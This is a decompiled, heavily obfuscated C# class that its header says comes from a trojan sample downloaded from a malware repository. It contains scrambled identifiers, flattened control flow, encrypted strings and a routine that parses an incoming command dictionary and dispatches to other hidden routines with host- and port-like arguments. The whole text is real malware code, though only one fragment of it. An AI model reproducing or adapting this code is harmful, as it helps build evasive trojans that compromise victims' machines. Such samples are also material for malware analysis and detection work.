// Decompiled with JetBrains decompiler
// Type: @Ӯ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

internal sealed class \u0040Ӯ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string y7F() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0039gH() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ӯ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    \u0040Ӯ.\u0040ӛ();
    int num1 = \u0040Ӯ.\u0040Ӝ() ? 3 : 2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_5;
        case 1:
        case 3:
          goto label_2;
        case 4:
          goto label_6;
        default:
          num1 = 4;
          continue;
      }
    }
label_2:
    \u0040Ӯ.\u0040Ӗ((object) this);
    goto label_6;
label_5:
    \u0040Ӯ.\u0040ӕ();
    goto label_2;
label_6:
    try
    {
      Dictionary<string, string> dictionary = _param2.\u0040ӗ<Dictionary<string, string>>();
      int num2 = 3;
      if (!\u0040Ӯ.\u0040Ӝ())
        goto label_21;
label_8:
      string str1 = dictionary[(string) \u0040Ӯ.\u0040ӗ(2120)];
      num2 = 1;
label_21:
      string str2;
      bool flag;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
          case 7:
          case 8:
          case 10:
            this.\u0040Ӕ = 0;
            num2 = 11;
            continue;
          case 1:
            str2 = str1;
            num2 = 6;
            continue;
          case 2:
            goto label_9;
          case 3:
            goto label_8;
          case 4:
            if (!flag)
            {
              \u0040ԝ.\u0040ו(dictionary[(string) \u0040Ӯ.\u0040ӗ(2544)], \u0040Ӯ.\u0040ә((object) dictionary[(string) \u0040Ӯ.\u0040ӗ(2562)]), \u0040Ӯ.\u0040ә((object) dictionary[(string) \u0040Ӯ.\u0040ӗ(2568)]), _param3);
              num2 = !\u0040Ӯ.\u0040ӛ() ? 5 : 10;
              continue;
            }
            if (!\u0040Ӯ.\u0040Ӝ())
            {
              num2 = 2;
              continue;
            }
            goto case 0;
          case 6:
            if (!\u0040Ӯ.\u0040Ә((object) str2, \u0040Ӯ.\u0040ӗ(2136)))
            {
              num2 = 9;
              continue;
            }
            flag = !dictionary.ContainsKey((string) \u0040Ӯ.\u0040ӗ(2544));
            goto case 4;
          case 9:
            if (!\u0040Ӯ.\u0040Ә((object) str2, \u0040Ӯ.\u0040ӗ(2150)))
            {
              num2 = 0;
              continue;
            }
            \u0040ԝ.\u0040ӹ();
            goto case 0;
          case 11:
            goto label_19;
          default:
            num2 = 4;
            continue;
        }
      }
label_9:
      throw new Exception((string) \u0040Ӯ.\u0040ӗ(2180));
label_19:;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040Ӯ.\u0040Ӛ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ә(object _param0, object _param1) => (string) _param0 == (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ә(object _param0) => Convert.ToInt32((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӝ() => false;
}
